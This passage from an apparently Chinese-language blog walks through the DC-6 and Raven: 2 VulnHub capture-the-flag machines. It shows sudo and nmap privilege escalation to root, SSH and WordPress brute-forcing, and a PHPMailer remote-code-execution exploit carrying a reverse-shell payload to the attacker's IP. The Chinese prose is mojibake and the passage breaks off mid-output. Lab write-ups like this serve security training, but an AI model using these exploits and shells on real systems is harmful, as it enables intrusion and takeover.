jens<br>backups.sh<br>www-data@dc-6:/home$ cat jens/backups.sh<br>cat jens/backups.sh<br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br>www-data@dc-6:/home$ ls mark<br>ls mark<br>stuff<br>www-data@dc-6:/home$ ls -l mark<br>ls -l mark<br>total 4<br>drwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuff<br>www-data@dc-6:/home$ ls -l mark/stuff<br>ls -l mark/stuff<br>total 4<br>-rw-r--r-- 1 mark mark 241 Apr 26  2019 things-to-do.txt<br>www-data@dc-6:/home$ cat mark/stuff/things-to-do.txt<br>cat mark/stuff/things-to-do.txt<br>Things to do:<br><br>- Restore full functionality for the hyperdrive (need to speak to Jens)<br>- Buy present for Sarah&#x27;s farewell party<br>- Add new user: graham - GSo7isUM1D4 - done<br>- Apply for the OSCP course<br>- Buy new laptop for Sarah&#x27;s replacement<br>www-data@dc-6:/home$ ls /sarah<br>ls /sarah<br>ls: cannot access &#x27;/sarah&#x27;: No such file or directory<br>www-data@dc-6:/home$ ls sarah<br>ls sarah<br>www-data@dc-6:/home$ <br></code></pre></td></tr></table></figure><p>åœ¨ Mark ç”¨æˆ·ç›®å½•ä¸‹æ‰¾åˆ°äº†ç”¨æˆ· graham çš„å¯†ç ï¼ŒSSH ç™»å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh graham@192.168.135.161</span>                      <br>graham@192.168.135.161&#x27;s password: <br>Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>graham@dc-6:~$ <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ sudo ï¼Œå‘ç°å¯ä»¥æ— å¯†ç ä»¥ jens ç”¨æˆ·æƒé™æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦å…·æœ‰å†™æƒé™ï¼Œå‘ç° jens å’Œ graham åŒå±äº devs ç»„ï¼Œè€Œæ”¹ç»„å…·æœ‰æ–‡ä»¶çš„å†™æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:/home/jens$ ls -l<br>total 4<br>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh<br>graham@dc-6:/home/jens$ id<br>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)<br>graham@dc-6:/home/jens$ cat /etc/group<br>[......]<br>graham:x:1001:<br>mark:x:1002:<br>sarah:x:1003:<br>jens:x:1004:<br>devs:x:1005:jens,graham<br></code></pre></td></tr></table></figure><p>å†™å…¥è°ƒç”¨ bash çš„å‘½ä»¤ï¼Œæ‰§è¡Œå¾—åˆ° jens ç”¨æˆ·æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:/home/jens$ echo &quot;#!/bin/bash\n/bin/bash&quot; &gt; backups.sh <br>-bash: !/bin/bash\n/bin/bash: event not found<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br><br>graham@dc-6:/home/jens$ echo &#x27;#!/bin/bash\n/bin/bash&#x27; &gt; backups.sh<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash\n/bin/bash</span><br>graham@dc-6:/home/jens$ ./backups.sh <br>-bash: ./backups.sh: /bin/bash\n/bin/bash: bad interpreter: No such file or directory<br><br>graham@dc-6:/home/jens$ echo &#x27;#!/bin/bash&#x27; &gt; backups.sh<br>graham@dc-6:/home/jens$ echo &#x27;/bin/bash&#x27; &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>/bin/bash<br><br>graham@dc-6:/home/jens$ sudo -u jens backups.sh<br><br>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:<br><br>    #1) Respect the privacy of others.<br>    #2) Think before you type.<br>    #3) With great power comes great responsibility.<br><br>[sudo] password for graham: <br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>jens@dc-6:~$ <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ jens ç”¨æˆ· sudoï¼Œå‘ç°å¯ä»¥æ— å¯†ç ä»¥ root ç”¨æˆ·æƒé™æ‰§è¡Œ nmapï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap<br></code></pre></td></tr></table></figure><p>å°è¯•ç›´æ¥äº¤äº’å¼ææƒï¼Œç”±äºç‰ˆæœ¬å¤ªé«˜ä¸æ”¯æŒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ sudo nmap --interactive<br>nmap: unrecognized option &#x27;--interactive&#x27;<br>See the output of nmap -h for a summary of options.<br>jens@dc-6:~$ nmap --version<br><br>Nmap version 7.40 ( https://nmap.org )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select<br></code></pre></td></tr></table></figure><p>ä»¥æ’ä»¶æ–¹å¼ææƒï¼ŒæˆåŠŸææƒå¹¶è¯»å–åˆ° flag ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ TF=$(mktemp)<br>jens@dc-6:~$ echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt; $TF<br>jens@dc-6:~$ sudo nmap --script=$TF<br><br>Starting Nmap 7.40 ( https://nmap.org ) at 2022-07-12 14:54 AEST<br>NSE: Warning: Loading &#x27;/tmp/tmp.3cEu0ssaoj&#x27; -- the recommended file extension is &#x27;.nse&#x27;.<br>root@dc-6:/home/jens# root<br>root@dc-6:/home/jens# theflag.txt<br>root@dc-6:/home/jens# <br><br>Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b <br> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P <br>  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; <br>   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) <br><br><br>Congratulations!!!<br><br>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><ol><li>WordPress ç«™ç‚¹ï¼šç”¨æˆ·æšä¸¾ã€åå°ç™»å½•çˆ†ç ´ï¼ˆwpscanï¼‰</li><li><code>activity_monitor</code> æ’ä»¶ï¼šè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</li><li>ç”¨æˆ·å¯†ç æ³„éœ²</li><li>sudo ææƒï¼š .sh æ–‡ä»¶ææƒã€nmap ææƒ</li></ol>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ravenï¼š2</title>
    <link href="/2022/07/10/Penetration/Vulnhub/Part-1/0x0B%20Raven-2/"/>
    <url>/2022/07/10/Penetration/Vulnhub/Part-1/0x0B%20Raven-2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0B-Raven-2-vulnhub"><a href="#0x0B-Raven-2-vulnhub" class="headerlink" title="0x0B Raven: 2~vulnhub"></a>0x0B Raven: 2~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/raven-2,269/">Raven: 2 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.158</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span>                       <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-10 05:55 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.00093s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00012s latency).<br>Nmap scan report for 192.168.135.158<br>Host is up (0.0021s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.73 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.158</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.158</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-10 05:57 EDT<br>Nmap scan report for 192.168.135.158<br>Host is up (0.00055s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)<br>|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)<br>|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)<br>|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Raven Security<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          34860/tcp6  status<br>|   100024  1          50898/udp6  status<br>|   100024  1          51438/tcp   status<br>|_  100024  1          58223/udp   status<br>51438/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:6F:9A:74 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td>2-4 (RPC #100000)</td></tr><tr><td>51438/tcp</td><td>open</td><td>status</td><td>1 (RPC #100024)</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>111ç«¯å£</strong></p><p>æŸ¥çœ‹æ— æœ</p><p><strong>51438ç«¯å£</strong></p><p>æŸ¥çœ‹æ— æœ</p><p><strong>80ç«¯å£</strong></p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.158</span><br>-----------------<br>URL_BASE: http://192.168.135.158/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br>---- Scanning URL: http://192.168.135.158/ ----<br>==&gt; DIRECTORY: http://192.168.135.158/css/<br>==&gt; DIRECTORY: http://192.168.135.158/fonts/<br>==&gt; DIRECTORY: http://192.168.135.158/img/<br>+ http://192.168.135.158/index.html (CODE:200|SIZE:16819)<br>==&gt; DIRECTORY: http://192.168.135.158/js/<br>==&gt; DIRECTORY: http://192.168.135.158/manual/<br>+ http://192.168.135.158/server-status (CODE:403|SIZE:303)<br>==&gt; DIRECTORY: http://192.168.135.158/vendor/<br>==&gt; DIRECTORY: http://192.168.135.158/wordpress/ <br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.158/wordpress/</code> ï¼Œå‘ç°æ˜¯ä¸ª WordPress ç«™ç‚¹ã€‚</p><p>æšä¸¾ WordPress ç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.158/wordpress --enumerate u</span><br>[+] URL: http://192.168.135.158/wordpress/ [192.168.135.158]<br>[i] User(s) Identified:<br><br>[+] michael<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] steven<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ wpscan è¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;michael\nsteven&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>michael<br>steven<br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P /usr/share/wordlists/rockyou.txt</span><br></code></pre></td></tr></table></figure><p>çˆ†ç ´ä¸€æ®µæ—¶é—´åæœªçˆ†ç ´å‡º ã€‚</p><p>è®¿é—® <code>http://192.168.135.158/vendor/</code> ï¼Œå‘ç°æ˜¯ä¸ªç›®å½•ï¼ŒæŸ¥çœ‹é‡Œé¢çš„æ–‡ä»¶ï¼š</p><p>åœ¨ <code>http://192.168.135.158/vendor/PATH</code> ä¸­ï¼Œæ‰¾åˆ° flag1 ä»¥åŠç›®å½•ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>vendor/<br>flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>http://192.168.135.158/vendor/README.md</code> ä¸­ï¼Œå¾—çŸ¥æ˜¯ phpMailer é‚®ä»¶æœåŠ¡ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># PHPMailer - A full-featured email creation <span class="hljs-keyword">and</span> transfer <span class="hljs-keyword">class</span> <span class="hljs-symbol">for</span> <span class="hljs-symbol">PHP</span><br></code></pre></td></tr></table></figure><p>phpMailer æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„ php å‘é€é‚®ä»¶ç±»ï¼ŒPHPMailer &lt; 5.2.18 ä¸­å­˜åœ¨é«˜å±å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…åªéœ€å·§å¦™åœ°æ„é€ å‡ºä¸€ä¸ªæ¶æ„é‚®ç®±åœ°å€ï¼Œå³å¯å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„å±å®³ã€‚</p><p>å¯ä»¥åœ¨ <code>http://192.168.135.158/vendor/VERSION</code> ä¸­æŸ¥çœ‹ phpMailer çš„ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ºï¼š<code>5.2.16</code> ã€‚</p><p>åœ¨ <code>http://192.168.15.172/vendor/</code> ç›®å½•ä¸‹å‘ç°äº† <code>PHPMailerAutoload.php</code> æ–‡ä»¶</p><p><strong>22ç«¯å£</strong></p><p>å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·åï¼Œå¯¹ SSH è¿›è¡Œçˆ†ç ´å°è¯•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.135.158 ssh</span><br></code></pre></td></tr></table></figure><p>çˆ†ç ´ä¸€æ®µæ—¶é—´åæœªçˆ†ç ´å‡º ã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>ç”¨ searchsploit æŸ¥æ‰¾ phpmailer çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¿™é‡Œä½¿ç”¨ 40974.py è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit phpmailer</span>  <br>---------------------------------------------------------------------------- -------------------------------<br> Exploit Title                                                              |  Path<br>---------------------------------------------------------------------------- -------------------------------<br>PHPMailer 1.7 - &#x27;Data()&#x27; Remote Denial of Service                           | php/dos/25752.txt<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40968.sh<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40970.php<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40974.py<br>PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploit)               | multiple/webapps/41688.rb<br>PHPMailer &lt; 5.2.20 - Remote Code Execution                                  | php/webapps/40969.pl<br>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution                    | php/webapps/42221.py<br>PHPMailer &lt; 5.2.21 - Local File Disclosure                                  | php/webapps/43056.py<br>WordPress Plugin PHPMailer 4.6 - Host Header Command Injection (Metasploit) | php/remote/42024.rb<br>---------------------------------------------------------------------------- -------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 40974.py</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ python è„šæœ¬çš„å†…å®¹ï¼š</p><blockquote><p>PS: åé—¨æ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºçš„è·¯å¾„åº”è¯¥æ˜¯å¿…é¡»è¦æ›´æ”¹çš„å¦åˆ™æ— æ³•åå¼¹shellï¼Œä¸”æ–‡ä»¶åä¸èƒ½ç”¨ backdoor.php </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://localhost:8080&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.0.12\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://192.168.135.158/contact.php&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.135.141\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/shell.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ kali ä¸­è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 40974.py</span> <br></code></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨é¶æœºçš„ç½‘ç«™æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª shell.php æ–‡ä»¶ ã€‚</p><p>kali ä¸­ç›‘å¬ 4444 ç«¯å£ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>http://192.168.135.158/shell.php</code> æ–‡ä»¶ï¼Œå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                  <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.158] 